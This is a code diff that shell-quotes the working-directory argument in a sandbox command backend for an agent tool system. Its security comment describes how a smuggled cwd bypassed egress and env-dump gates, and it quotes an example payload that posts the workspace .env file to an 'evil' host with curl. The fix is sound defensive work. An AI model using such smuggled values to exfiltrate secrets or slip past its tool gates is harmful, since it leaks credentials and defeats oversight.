@@ -6,6 +6,7 @@
  */
 
 import type { ExecutionBackend } from '../types.js'
+import { shellQuote } from '../utilities.js'
 
 /** Minimal Sandbox shape to avoid hard dependency on \@molecule/api-code-sandbox. */
 interface SandboxLike {
@@ -50,7 +51,13 @@ export function createSandboxBackend(
     },
 
     async run(command: string, opts?: { cwd?: string; timeout?: number }) {
-      const fullCommand = opts?.cwd ? `cd ${opts.cwd} && ${command}` : command
+      // SECURITY [C3-1]: shell-quote cwd so it is always a single literal path. It was
+      // interpolated raw into `sh -c`, and every pre-tool gate (egress confirm,
+      // destructive-command preview, env-dump block) inspects only `command` — so a
+      // payload smuggled via cwd (e.g. "/workspace/. && curl -d @/workspace/.env evil")
+      // executed ungated. Quoting makes a malicious cwd simply fail `cd`; legitimate
+      // metacharacter-free paths are unaffected.
+      const fullCommand = opts?.cwd ? `cd ${shellQuote(opts.cwd)} && ${command}` : command
       // sandbox.exec is the Sandbox interface method — runs inside Docker, inherently sandboxed
       const result = await sandbox.exec(fullCommand, { timeout: opts?.timeout })
       return { stdout: result.stdout, stderr: result.stderr, exitCode: result.exitCode }
